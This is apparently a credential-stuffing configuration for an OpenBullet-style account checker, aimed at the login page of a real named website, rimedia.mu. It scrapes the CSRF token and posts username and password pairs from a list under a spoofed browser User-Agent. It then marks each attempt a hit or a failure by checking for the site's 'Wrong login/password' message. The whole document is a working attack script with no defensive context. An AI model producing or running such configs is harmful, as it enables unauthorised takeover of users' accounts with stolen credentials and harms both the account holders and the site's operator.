[SCRIPT]
REQUEST GET "https://www.rimedia.mu/web/login" 
  
  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36" 
  HEADER "Pragma: no-cache" 
  HEADER "Accept: */*" 

PARSE "<SOURCE>" CSS "[name=csrf_token] " "value" -> VAR "CSRF" 

REQUEST POST "https://www.rimedia.mu/web/login" 
  CONTENT "csrf_token=<CSRF>&login=<USER>&password=<PASS>&redirect=" 
  CONTENTTYPE "application/x-www-form-urlencoded" 
  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36" 
  HEADER "Pragma: no-cache" 
  HEADER "Accept: */*" 

KEYCHECK 
  KEYCHAIN Failure OR 
    KEY "Wrong login/password" 
    KEY "<p class=\"alert alert-danger" 
  KEYCHAIN Success OR 
    KEY "<SOURCE>" DoesNotContain "Wrong login/password" 

